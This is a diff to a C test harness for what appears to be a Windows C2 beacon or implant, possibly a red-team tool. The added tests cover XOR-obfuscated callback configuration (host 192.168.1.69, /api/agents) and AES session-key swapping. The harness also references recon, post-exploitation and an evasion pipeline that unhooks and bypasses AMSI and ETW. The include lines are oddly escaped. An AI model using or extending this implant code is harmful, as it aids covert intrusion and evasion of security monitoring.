@@ -2,14 +2,15 @@
 // Build target: beacon_test (see CMakeLists.txt)
 // Compile flag: BEACON_TEST
 
-#include "anti_analysis.h"
-#include "common.h"
-#include "comms.h"
-#include "crypto.h"
-#include "evasion.h"
-#include "killswitch.h"
-#include "postex.h"
-#include "recon.h"
+#include \"anti_analysis.h\"
+#include \"beacon.h\"
+#include \"common.h\"
+#include \"comms.h\"
+#include \"crypto.h\"
+#include \"evasion.h\"
+#include \"killswitch.h\"
+#include \"postex.h\"
+#include \"recon.h\"
 // ============================================================
 // COMMS TEST — call this explicitly
 // ============================================================
@@ -22,7 +23,7 @@ static BOOL test_comms(void) {
   checking_connection(&connected);
   printf("[*] Connection result: %s\n", connected ? "OK" : "FAILED");
   if (!connected) {
-    printf("[!] Cannot reach C2 at %S:%d\n", C2_HOST, C2_PORT);
+    printf("[!] Cannot reach C2 at %S:%d\n", g_CallbackHost, CALLBACK_PORT);
     printf("[!] Is the listener running? Firewall open?\n");
     return FALSE;
   }
@@ -67,6 +68,9 @@ int main() {
 #endif
 
   int passed = 0, failed = 0, skipped = 0;
+
+  // Decode XOR'd config strings before any tests use them
+  beacon_decode_config();
 
   // ── Test 1: Recon ─────────────────────────────────────────
   printf("[TEST 1] Recon\n");
@@ -209,6 +213,117 @@ int main() {
   // ── Test 23: Full evasion pipeline ────────────────────────
   printf("\n[TEST 23] Full evasion pipeline (unhook + AMSI + ETW)\n");
   if (test_evasion_full_pipeline()) passed++; else failed++;
+
+  // ============================================================
+  // XOR DECODE + SESSION KEY TESTS
+  // ============================================================
+
+  // ── Test 24: xor_decode basic round-trip ──────────────────
+  printf("\n[TEST 24] xor_decode — basic round-trip\n");
+  {
+    BYTE buf[] = {'H', 'e', 'l', 'l', 'o'};
+    BYTE orig[] = {'H', 'e', 'l', 'l', 'o'};
+    xor_decode(buf, 5, 0xAA);
+    // After XOR, bytes should differ from original
+    BOOL changed = (memcmp(buf, orig, 5) != 0);
+    // XOR again to get back original
+    xor_decode(buf, 5, 0xAA);
+    BOOL restored = (memcmp(buf, orig, 5) == 0);
+    printf("  Changed after XOR: %s\n", changed ? "YES" : "NO");
+    printf("  Restored after double XOR: %s\n", restored ? "YES" : "NO");
+    if (changed && restored) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 25: xor_decode with zero key (no-op) ────────────
+  printf("\n[TEST 25] xor_decode — zero key is no-op\n");
+  {
+    BYTE buf[] = {0x41, 0x42, 0x43};
+    BYTE orig[] = {0x41, 0x42, 0x43};
+    xor_decode(buf, 3, 0x00);
+    if (memcmp(buf, orig, 3) == 0) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 26: xor_decode with 0xFF key ─────────────────────
+  printf("\n[TEST 26] xor_decode — 0xFF key flips all bits\n");
+  {
+    BYTE buf[] = {0x00, 0xFF, 0xAA, 0x55};
+    xor_decode(buf, 4, 0xFF);
+    BOOL ok = (buf[0] == 0xFF && buf[1] == 0x00 &&
+               buf[2] == 0x55 && buf[3] == 0xAA);
+    if (ok) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL: %02X %02X %02X %02X\n",
+                   buf[0], buf[1], buf[2], buf[3]); failed++; }
+  }
+
+  // ── Test 27: xor_decode zero-length buffer ────────────────
+  printf("\n[TEST 27] xor_decode — zero-length buffer (no crash)\n");
+  {
+    BYTE buf[] = {0x41};
+    xor_decode(buf, 0, 0xAA);  // should be a no-op
+    if (buf[0] == 0x41) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 28: beacon_decode_config produces valid strings ──
+  printf("\n[TEST 28] beacon_decode_config — decoded host matches\n");
+  {
+    // beacon_decode_config was already called; check globals
+    beacon_decode_config();
+    BOOL hostOk = (lstrcmpW(g_CallbackHost, L"192.168.1.69") == 0);
+    BOOL epOk   = (lstrcmpW(g_CallbackEndpoint, L"/api/agents") == 0);
+    BOOL pfxOk  = (strcmp(g_AgentIdPrefix, "AGENT") == 0);
+    printf("  Host:     \"%S\" %s\n", g_CallbackHost, hostOk ? "PASS" : "FAIL");
+    printf("  Endpoint: \"%S\" %s\n", g_CallbackEndpoint, epOk ? "PASS" : "FAIL");
+    printf("  Prefix:   \"%s\" %s\n", g_AgentIdPrefix, pfxOk ? "PASS" : "FAIL");
+    if (hostOk && epOk && pfxOk) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 29: crypto_set_session_key — valid key swap ──────
+  printf("\n[TEST 29] crypto_set_session_key — valid 32+16\n");
+  {
+    BYTE testKey[32] = {0};
+    BYTE testIv[16]  = {0};
+    for (int i = 0; i < 32; i++) testKey[i] = (BYTE)(i + 1);
+    for (int i = 0; i < 16; i++) testIv[i]  = (BYTE)(0xA0 + i);
+
+    BOOL setOk = crypto_set_session_key(testKey, 32, testIv, 16);
+    printf("  set_session_key returned: %s\n", setOk ? "TRUE" : "FALSE");
+
+    // Verify the new key works by doing an encrypt/decrypt round-trip
+    const CHAR *msg = "session key test payload";
+    PVOID pCipher = NULL; DWORD cLen = 0;
+    PVOID pPlain = NULL;  DWORD pLen = 0;
+    BOOL encOk = aes_encrypt_payload((PBYTE)msg, (DWORD)strlen(msg),
+                                     &pCipher, &cLen);
+    BOOL decOk = FALSE;
+    if (encOk) {
+      decOk = aes_decrypt_payload((PBYTE)pCipher, cLen, &pPlain, &pLen);
+    }
+    BOOL match = decOk && (pLen == (DWORD)strlen(msg)) &&
+                 (memcmp(pPlain, msg, strlen(msg)) == 0);
+    printf("  Encrypt: %s  Decrypt: %s  Match: %s\n",
+           encOk ? "OK" : "FAIL", decOk ? "OK" : "FAIL",
+           match ? "PASS" : "FAIL");
+    if (pCipher) HeapFree(GetProcessHeap(), 0, pCipher);
+    if (pPlain)  HeapFree(GetProcessHeap(), 0, pPlain);
+    if (setOk && match) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 30: crypto_set_session_key — reject bad sizes ────
+  printf("\n[TEST 30] crypto_set_session_key — reject bad sizes\n");
+  {
+    BYTE dummy[64] = {0};
+    BOOL badKey = crypto_set_session_key(dummy, 16, dummy, 16); // key too short
+    BOOL badIv  = crypto_set_session_key(dummy, 32, dummy, 8);  // IV too short
+    printf("  16-byte key rejected: %s\n", badKey ? "NO (FAIL)" : "YES (PASS)");
+    printf("  8-byte IV rejected:   %s\n", badIv  ? "NO (FAIL)" : "YES (PASS)");
+    if (!badKey && !badIv) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
 
   // ── Summary ───────────────────────────────────────────────
   printf("\n========================================\n");
